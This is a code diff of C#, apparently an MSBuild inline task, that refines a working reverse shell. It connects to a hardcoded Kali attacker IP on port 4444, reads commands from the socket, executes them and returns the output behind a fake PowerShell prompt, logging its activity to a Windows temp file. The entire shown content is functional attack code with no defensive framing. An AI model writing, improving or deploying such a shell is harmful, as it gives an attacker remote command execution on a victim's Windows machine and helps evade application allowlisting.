@@ -24,39 +24,38 @@
             }
             
             private void StartShell() {
-                string host = "192.168.1.8";  // CHANGE TO YOUR KALI IP
+                string host = "192.168.1.8";  // Your Kali IP
                 int port = 4444;
                 
                 try {
-                    // Write debug info
-                    File.WriteAllText("C:\\Windows\\Temp\\msbuild.log", "Starting connection to " + host + ":" + port + " at " + DateTime.Now.ToString());
+                    File.WriteAllText("C:\\Windows\\Temp\\msbuild.log", "Starting connection to " + host + ":" + port);
                     
                     using(TcpClient client = new TcpClient(host, port)) {
-                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnected successfully!");
+                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnected! Setting up streams...");
                         
-                        using(NetworkStream stream = client.GetStream()) {
-                            // Send welcome message
-                            string welcome = "=== Reverse Shell Connected ===\\n";
-                            byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
-                            stream.Write(welcomeBytes, 0, welcomeBytes.Length);
+                        NetworkStream stream = client.GetStream();
+                        StreamReader reader = new StreamReader(stream);
+                        StreamWriter writer = new StreamWriter(stream);
+                        writer.AutoFlush = true;
+                        
+                        // Send initial prompt
+                        writer.WriteLine("=== MSBuild Reverse Shell Connected ===");
+                        writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
+                        
+                        string command;
+                        while(client.Connected && (command = reader.ReadLine()) != null) {
+                            File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nReceived command: " + command);
                             
-                            byte[] buffer = new byte[1024];
-                            int bytesRead;
+                            if(command.Trim() == "exit") break;
+                            if(string.IsNullOrEmpty(command.Trim())) continue;
                             
-                            while((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0) {
-                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
-                                
-                                if (command == "exit") break;
-                                if (string.IsNullOrEmpty(command)) continue;
-                                
-                                string result = ExecuteCommand(command);
-                                byte[] output = Encoding.ASCII.GetBytes(result);
-                                stream.Write(output, 0, output.Length);
-                                stream.Flush();
-                            }
+                            string result = ExecuteCommand(command.Trim());
+                            writer.Write(result);
+                            writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
                         }
+                        
+                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnection closed normally");
                     }
-                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnection closed normally");
                 } catch (Exception ex) {
                     File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nError: " + ex.Message);
                 }
@@ -77,13 +76,13 @@
                     string error = process.StandardError.ReadToEnd();
                     process.WaitForExit();
                     
-                    if (!string.IsNullOrEmpty(error)) {
-                        output = output + "\\n" + error;
+                    if(!string.IsNullOrEmpty(error)) {
+                        output += "\n" + error;
                     }
                     
                     return output;
-                } catch (Exception ex) {
-                    return "Error executing command: " + ex.Message + "\\n";
+                } catch(Exception ex) {
+                    return "Error: " + ex.Message + "\n";
                 }
             }
         }
